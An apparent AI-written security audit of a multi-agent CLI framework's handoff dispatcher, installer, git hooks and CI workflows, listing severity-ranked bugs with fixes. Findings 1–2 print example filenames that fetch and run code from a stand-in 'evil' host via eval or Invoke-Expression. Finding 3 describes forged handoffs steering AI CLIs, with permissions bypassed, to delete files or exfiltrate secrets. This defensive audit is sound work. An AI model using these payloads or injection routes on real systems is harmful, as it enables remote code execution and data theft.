# Latent-issue audit — multi-CLI framework

**Author:** claude-code · **Date:** 2026-07-11 · **Mode:** READ-ONLY (no fixes applied)
**Scope:** fleet PowerShell (`tools/4ai-panes/`), handoff delivery (`.ai/tools/`, per-CLI hooks),
installer (`scripts/install-template.sh`), git hooks (`scripts/git-hooks/`), CI (`.github/workflows/`),
cross-cutting injection/secret surfaces.

Every finding cites `file:line`, a realistic failure scenario, a severity, and a one-line fix.
"Confirmed bug" = I traced/tested the failing path. "Theoretical risk" = plausible but
timing/config-dependent or not fully exploited here.

---

## Severity-ordered summary

| # | Sev | Class | Finding | Evidence |
|---|-----|-------|---------|----------|
| 1 | **CRITICAL** | Confirmed | Crafted handoff **filename** → arbitrary code exec via `Invoke-Expression` in pane-runner | `pane-runner.ps1:126`, `:83-88`, `:506-513` |
| 2 | **CRITICAL** | Confirmed | Crafted handoff **filename** → arbitrary code exec via `eval` in dispatcher | `dispatch-handoffs.sh:186`, `:57`, `:169` |
| 3 | **HIGH** | Confirmed (design) | Auto/Risk human-gate trusts **self-declared** `Risk:`; no handoff provenance → hostile handoff auto-runs a CLI with permissions bypassed | `dispatch-handoffs.sh:158`, template.md `Risk: <A\|B\|C>` |
| 4 | **MED** | Confirmed | pre-commit sensitive/territory/tombstone guards are **case-sensitive** → fail-open on Windows' case-insensitive FS (`.ENV`, `ID_RSA`, `.Kimi/`) | `pre-commit:27-47,66-95` |
| 5 | **MED** | Confirmed | Version-bump allowlist omits **shipped** `scripts/fleet-init.sh` + `scripts/sync-4ai-panes-install.ps1` | `check-version-bump.sh:47-53` vs installer `:396-397` |
| 6 | **MED** | Confirmed | Update-mode **wipes** gitignored local state: `.claude/settings.local.json`, `.ai/research/` | `install-template.sh:235,265-295,345` |
| 7 | **MED** | Confirmed | `reconcile_block` **truncates user global config to EOF** if end-sentinel precedes begin (hand-mangled) | `install-template.sh:748-758` |
| 8 | **MED** | Confirmed | `find_python` probe can't reject the WindowsApps stub → `wire_mcp`/`reconcile_mcp` silently no-op while reporting success | `install-template.sh:628-637,678-692` |
| 9 | **MED** | Confirmed | Version-bump gate runs only on `pull_request`; **direct push to master is ungated** | `gates.yml:37` |
| 10 | **MED** | Theoretical | Cross-consumer claim race: bash non-atomic `:>` then `printf` vs PS "empty claim = unclaimed" → double-process window | `dispatch-handoffs.sh:135-141` + `pane-runner.ps1:284-304,312-341` |
| 11 | **MED** | Theoretical | `Selector.ps1` interpolates project dir name into `cmd.exe /c "..."` unescaped | `Selector.ps1:1065,1227,1248,1278` |
| 12 | LOW/MED | Theoretical | `notify.ps1` may `Write-Warning` an exception string containing the request URL with the Telegram bot token | `notify.ps1:128,131` |
| 13 | LOW | Confirmed | Quarantine sidecar written with `Set-Content -Encoding utf8` → BOM under PS 5.1, violating the BOM-less contract | `pane-runner.ps1:453` vs `:234-235` |
| 14 | LOW | Theoretical | PS stale-reclaim double-win (`FileMode::Create` catch path) | `pane-runner.ps1:336-341` |
| 15 | LOW | Theoretical | Corrupt/partial sidecar → treated as unclaimed / not-quarantined (poison pill re-runs) | `pane-runner.ps1:183,289,393` |
| 16 | LOW | Theoretical | pane-runner infinite recover-spin when a non-handoff-bound exception recurs | `pane-runner.ps1:674-689` |
| 17 | LOW | Theoretical | release.yml master-push vs tag-push use different concurrency groups → release-create TOCTOU | `release.yml:50-52,102` |

Solid areas (below) are called out honestly rather than padded with nitpicks.

---

## Findings

### 1. CRITICAL — Handoff filename → RCE via `Invoke-Expression` (pane-runner)

**Evidence.** `pane-runner.ps1:80-88` builds the launch string by embedding the prompt in a
double-quoted argument: `return "claude -p \"$Prompt\" --permission-mode acceptEdits"`. The prompt
is `Get-InitialPrompt` = `"Process the open handoff at $RelPath ..."` (`:483-485`), and `$RelPath`
is the handoff path derived from the on-disk filename (`Invoke-HandoffRun`, `:506-513`;
`Get-QualifyingHandoff` globs `*.md` with **no filename sanitization**, `:148`). The assembled string
is executed with `Invoke-Expression $cmd` (`:126`).

**Scenario.** A handoff file named `202607111200-a$(iwr http://evil/x.ps1|iex).md` (Windows filenames
permit `$ ( ) ` `` ` `` `; & { }`) qualifies with `Auto: yes / Status: OPEN / Risk: A` in its body. When
the pane picks it up, `Invoke-Expression` evaluates the `$( … )` subexpression → arbitrary code runs on
the operator's machine, as the operator, with the CLI about to run under `--permission-mode acceptEdits`.
Delivery vectors: a PR to a framework-using repo, a cloned hostile project, or any one compromised CLI
dropping a file into `to-<cli>/open/`.

**Fix.** Never build a string for `Invoke-Expression`; invoke natively with an argument array —
`& 'claude' '-p' $Prompt '--permission-mode' 'acceptEdits'` — so the filename is data, never code.

---

### 2. CRITICAL — Handoff filename → RCE via `eval` (dispatcher)

**Evidence.** `dispatch-handoffs.sh:55-91` builds `headless_cmd` with the handoff path in a
double-quoted prompt (`:57`, e.g. `claude) printf '%s' "claude -p \"$prompt\" ..."`). `$prompt`
embeds `$file` = `$rel` = `${f#$root/}` from the `*.md` glob (`:152,163,169`). The result is run with
`eval "$cmd"` (`:186`).

**Scenario.** Same class as #1 but under Git-Bash: a filename containing backticks or `$()` (both legal
in Windows filenames) — e.g. `` x`curl evil|sh`.md `` — is expanded by `eval`. Auto-dispatch fires this
from a SessionStart hook (`dispatch-own-queue.sh`), so no operator action is needed. The spawned CLI
also runs with `--trust-all-tools` / `--auto` / `acceptEdits`.

**Fix.** Drop `eval`. Store argv in an array and run it directly (`"${cmd[@]}"`), or pass the prompt via
`printf %q`-quoted single tokens. The prompt/path must never re-enter the parser.

---

### 3. HIGH — Human-gate trusts self-declared `Risk:`; no handoff provenance

**Evidence.** The only barrier to autonomous headless execution is
`grep -qiE '^Risk:[[:space:]]*[AB]' ` (`dispatch-handoffs.sh:158`, mirrored in every
`dispatch-own-queue.sh`). `Risk:` is a free-text field the **handoff author** writes
(`template.md`: `Risk: <A | B | C>`). A grep of `.ai/handoffs/README.md` finds **no** signature,
checksum, or author-authenticity check.

**Scenario.** A hostile or mistaken handoff simply writes `Auto: yes` + `Risk: A`. The dispatcher then
launches the recipient CLI headless with permissions bypassed (`--trust-all-tools` / `--auto` /
`acceptEdits`) on that handoff's instructions — "delete X", "exfiltrate .env", etc. — with the human
gate (Risk C) never consulted. The gate is only as trustworthy as whoever can write into `open/`.

**Fix.** Treat `open/` as a trust boundary: require a provenance marker the dispatcher validates (e.g.
committed-by-known-CLI, or an out-of-band allowlist of handoff SHAs) before honoring `Risk: A/B`;
otherwise fall back to human relay. At minimum, document that any writer to `open/` is fully trusted and
lock down who/what can write there.

---

### 4. MED — pre-commit guards fail OPEN on case-insensitive FS

**Evidence.** `pre-commit` uses bash `case` (case-sensitive) for `_is_sensitive` (`:27-37`),
`_is_tombstone` (`:42-47`), and `_territory_violation` (`:66-95`). I confirmed:
`.ENV`, `ID_RSA`, and `.Kimi/x` all return **NO MATCH** against `.env` / `id_rsa*` / `.kimi/*`.

**Scenario.** On Windows (default case-insensitive NTFS), committing `.ENV`, `Secrets.yaml`, `ID_RSA`,
or a wrong-CLI write under `.Kimi/steering/…` bypasses the backstop entirely — the exact material the
hook exists to stop. `git` records whatever case was written, so this is trivial and accidental, not
adversarial.

**Fix.** Lowercase the path before matching (`p_lc="$(printf '%s' "$p" | tr '[:upper:]' '[:lower:]')"`)
and test the lowercased copy, or add `shopt -s nocasematch` around the decision functions.

---

### 5. MED — Version-bump allowlist misses two SHIPPED scripts

**Evidence.** The installer copies `scripts/fleet-init.sh` and `scripts/sync-4ai-panes-install.ps1`
into every adopter (`install-template.sh:396-397`), but `check-version-bump.sh:47-53` only allowlists
`scripts/git-hooks/*|scripts/install-template.sh`. Both scripts fall through to `*) return 1` (not
versioned). (Note: `tools/4ai-panes/*` is correctly excluded — it is deliberately **not** shipped,
`install-template.sh:405-413`.)

**Scenario.** A change to `sync-4ai-panes-install.ps1` (which the copied git hooks invoke) ships to
adopters with **no version bump** → their `.ai/.framework-version` still equals the template's → the
drift warning stays silent → the behavior change lands undetected.

**Fix.** Add `scripts/fleet-init.sh` and `scripts/sync-4ai-panes-install.ps1` (or `scripts/*.sh|*.ps1`
minus the CI-only helpers) to the `is_versioned` allowlist.

---

### 6. MED — Update-mode wipes gitignored local state

**Evidence.** `copy_dir` does `rm -rf "$dst"` before copy (`:235`). Phase 1 runs it unconditionally for
`.claude`, `.kimi`, `.kiro` (`:345-347`). `preserve_ai_state` stashes **only** `.ai/activity`,
`.ai/reports`, and `.ai/handoffs/to-*/{open,done}` (`:265-295`) — not `.ai/research/`, not
`.ai/handoffs/.claims|.quarantine`, and nothing under `.claude/`.

**Scenario.** An adopter who accumulated `.ai/research/` notes, or a local
`.claude/settings.local.json` (gitignored permission allowlist), loses it on the next framework
update: `.claude` is `rm -rf`'d and replaced by the template; `.ai/research` is replaced by the
template's (empty) copy. Git recovers committed files but not gitignored ones.

**Fix.** Extend `preserve_ai_state` to cover `.ai/research/` and preserve gitignored per-CLI local files
(at least `*/settings.local.json`) across the destructive copy; or copy-merge instead of `rm -rf`.

---

### 7. MED — `reconcile_block` truncates config to EOF on a mangled sentinel order

**Evidence.** SUPERSEDE branch (`:748-758`): `have_block` is true when begin AND end both exist
anywhere (`:723-725`). The awk emits the snippet at the begin line and sets `skipping=1` until it sees
the end line. If a hand-edited file has the **end sentinel before the begin sentinel**, the end line is
consumed early (`skipping=0` no-op), then begin sets `skipping=1` with no following end → **every line
from begin to EOF is dropped**.

**Scenario.** A user reorders/duplicates lines in `~/.kimi-code/config.toml` around the managed block;
the next installer run silently deletes the tail of their global config. The atomic temp-rename doesn't
help — the truncated content is what gets written.

**Fix.** Validate sentinel ordering (begin index < end index, exactly one of each) before rewriting;
on any anomaly, warn and skip rather than rewrite.

---

### 8. MED — `find_python` can't detect the WindowsApps stub → silent MCP no-op

**Evidence.** `find_python` accepts an interpreter if `"$py" -c "import json,sys"` exits 0
(`:631`). The pre-commit header (`pre-commit:15-17`) documents that this host's `python3` is a
WindowsApps alias stub with "empty stdout, exit 0". Such a stub passes the probe, but the actual JSON
heredocs in `wire_mcp` (`:678-692`) and `reconcile_mcp` (`:797-820`) then run through it, exit 0, and
change nothing — while the `if … then track/log` reports success.

**Scenario.** On a host with the stub and an existing `.mcp.json`, codegraph is reported "merged" but
isn't; deprecated `kimigraph`/`kirograph` servers are reported "pruned" but aren't (the every-terminal
startup error persists). Fresh installs (no existing `.mcp.json`) are unaffected — that path uses `cat`.

**Fix.** Make the probe verify output, e.g. `[ "$("$py" -c 'print(1)' 2>/dev/null)" = "1" ]`, so the
silent stub is rejected and the warn-and-skip fallback engages.

---

### 9. MED — Version-bump gate skipped on direct master push

**Evidence.** `gates.yml:36-38` guards the version-bump step with
`if: github.event_name == 'pull_request'`. The workflow also triggers on `push: branches: [master]`
(`:18-20`), where the step is skipped.

**Scenario.** A direct push to master (or a squash that bypasses the PR event) that changes versioned
content without a bump is not caught. Enforcement rests entirely on branch protection — which the file
itself notes must be configured manually in the GitHub UI and "cannot be committed" (`:9-12`).

**Fix.** Either run `check-version-bump.sh` on the push event too (diffing `HEAD~1..HEAD`), or document
that branch protection requiring PRs is mandatory for the gate to mean anything.

---

### 10. MED (theoretical) — Cross-consumer claim race on the shared sidecar

**Evidence.** The dispatcher and a live pane use the **same** sidecar path
(`.ai/handoffs/.claims/<cli>__<slug>.claim.json`). The dispatcher's `acquire_claim` creates it atomically
with noclobber `:>` but then fills it with `printf` in a **separate, non-atomic** step (`:135-141`) —
leaving a window where the file exists but is empty. The pane's `Test-HandoffClaimed` treats an
empty/unparseable claim as **unclaimed** (`Get-Content|ConvertFrom-Json` in a try/catch returning
`$null`, `:289`), then `Claim-Handoff` reclaims it (`:336-341`).

**Scenario.** Bash wins noclobber and, before its `printf` lands, a pane reads the 0-byte file → parses
as unclaimed → reclaims and processes; bash also believes it won → **both process the same handoff**.
Window is sub-millisecond and single-host, so unlikely but real, and it defeats the exact guarantee the
sidecar exists to provide.

**Fix.** Make the bash claim write atomic: write JSON to a temp file in the same dir and `mv` into place
(as `Write-Claim` already does on the PS side), so a claim file is never observed empty.

---

### 11. MED (theoretical) — `Selector.ps1` project name into `cmd.exe /c` unescaped

**Evidence.** `Build-FleetTabCmd` interpolates `$TargetDir` / `$leaf` (a project directory name) into a
Windows-Terminal command string (`:495-524`), which is run as
`& cmd.exe /c "`"$wtExe`" $wtCmd"` (`:1065,1227,1248,1278`).

**Scenario.** A project folder named with cmd metacharacters (`&`, `%VAR%`, `^`) — plausible on a shared
drive or a cloned repo dir — is a command-injection surface into `cmd.exe`. The surrounding double quotes
mitigate `&`, and `"`/`/`/`\` are illegal in dir names, so clean exploitation is hard; but `%…%`
environment expansion and edge quoting make this fragile. Lower confidence than #1/#2.

**Fix.** Launch WT via `Start-Process -FilePath $wtExe -ArgumentList @(...)` with an argument array
instead of routing a hand-built string through `cmd.exe /c`.

---

### 12. LOW/MED (theoretical) — Telegram token may leak into pane logs

**Evidence.** `notify.ps1:128` builds `https://api.telegram.org/bot$($cfg.BotToken)/sendMessage`; the
catch at `:131` does `Write-Warning "... $($_.Exception.Message)"`. Some `Invoke-RestMethod`/WebException
messages include the full request URI.

**Scenario.** A network error whose message embeds the URL writes the bot token to the pane console
(which may be captured/scrolled/screenshotted). The token-in-URL is standard for Telegram; the leak is in
logging the exception verbatim.

**Fix.** Scrub the URL from any logged exception text (log a fixed string like "telegram send failed
(HTTP)"), never the raw `.Exception.Message`.

---

### 13. LOW — Quarantine sidecar written with a BOM (PS 5.1)

**Evidence.** `Add-HandoffAttempt` writes with `Set-Content -Path $tmp -Encoding utf8 -NoNewline`
(`:453`). Under PS 5.1 `-Encoding utf8` **prepends a BOM** — exactly what `Write-Claim` avoids via
`WriteAllBytes` and documents at `:219-220,234-235`.

**Scenario.** In-repo consumers all read `.quarantine` via PS (which strips the BOM on read), so impact
is low today; but it violates the stated BOM-less contract and would break any bash reader added later.

**Fix.** Write the quarantine sidecar via `[IO.File]::WriteAllBytes` with
`[Text.Encoding]::UTF8.GetBytes`, matching `Write-Claim`.

---

### 14-17. LOW (theoretical), briefly

- **14** `Claim-Handoff` stale-reclaim (`:336-341`): two racers that both judge a sidecar stale can each
  open `FileMode::Create` sequentially and both return `$true`. Fix: reclaim under an advisory lock or
  re-verify emptiness after acquiring the exclusive handle.
- **15** Corrupt/partial claim or quarantine JSON is swallowed to `$null` (`:183,289,393`) → treated as
  unclaimed / not-quarantined, so a poison pill can re-run. Acceptable fail-open, but note it defeats
  quarantine on a corrupted sidecar. Fix: on parse failure, treat as *claimed/quarantined* (fail-closed)
  for a grace window.
- **16** The generic recovery catch (`pane-runner.ps1:674-689`) only quarantines when `$handoff` is set.
  A recurring exception in the poll phase itself (e.g. `Get-QualifyingHandoff` throws) loops forever with
  ALERT + `PollSeconds` sleep and never crashes out to the supervisor. Fix: bound consecutive
  non-handoff errors and exit non-zero so the supervisor's backoff/cap engages.
- **17** `release.yml` groups concurrency by `github.ref` (`:50-52`), so a same-version master push and a
  manual tag push run in **different** groups; both can pass the live `gh release view` gate (`:102`) and
  race `action-gh-release`. Narrow (needs simultaneous master+tag for one new version). Fix: also gate on
  a lock keyed by the resolved tag, or serialize by tag rather than ref.

---

## Areas that are actually solid (no action)

- **Recursion guard** (`AI_HANDOFF_DISPATCH`) is consistent and correct across claude/kimi/kiro
  `dispatch-own-queue.sh` (each checks it first and exits 0), and the dispatcher exports it into every
  spawned child (`dispatch-handoffs.sh:186`). No fork-bomb path found.
- **pre-commit fail-CLOSED discipline** is good: unknown/unset committer → strictest branch (`:90-92,
  133-136`); `mktemp`/`git diff --cached` failures abort with exit 1 (`:144-154`); `_is_sync_replica`
  fails closed when `sync.md` is missing (`:57-60`). The identity "spoofing" concern is by-design — this
  is an accident-prevention backstop with an explicit `--no-verify` owner override, not a security
  boundary against a malicious local actor.
- **Risk-C default** is fail-safe: a missing/blank/`C` Risk line is treated as human-gated
  (`dispatch-handoffs.sh:157-161`). (The weakness is #3 — trusting the *value*, not the default.)
- **release.yml idempotency** via live `gh release view` (`:102`) plus `cancel-in-progress: false`
  correctly prevents half-uploaded/duplicate releases on retries and same-group races.
- **post-commit / post-checkout / post-merge** correctly never block (every path `exit 0`), guard the
  no-`HEAD~1`/no-`ORIG_HEAD` cases, and degrade loudly when PowerShell is absent.
- **Supervisor backoff math** is sound: rolling-window prune, healthy-run reset, `Min(cap, base·2^(n-1))`,
  and `-ge MaxRetries` give-up are all correct; terminal paths `break`/return so the pane's `-NoExit`
  survives.

---

## Top 5 to fix next

1. **#1 + #2 — filename→RCE** (CRITICAL): replace `Invoke-Expression`/`eval` string-building with native
   argv invocation in both `pane-runner.ps1` and `dispatch-handoffs.sh`. Single highest-impact fix.
2. **#3 — handoff provenance** (HIGH): stop trusting self-declared `Risk:` from anyone who can write
   `open/`; require a validated provenance marker or lock down write access.
3. **#4 — case-insensitive guard fail-open** (MED): lowercase paths before matching in `pre-commit` so
   `.ENV`/`ID_RSA`/`.Kimi/` can't slip through on Windows.
4. **#6 — update-mode data loss** (MED): preserve `.ai/research/` and gitignored per-CLI local files
   across `copy_dir`'s `rm -rf`.
5. **#7 + #8 — installer silent failures** (MED): validate sentinel ordering in `reconcile_block`, and
   make `find_python`'s probe verify output so the WindowsApps stub is rejected.
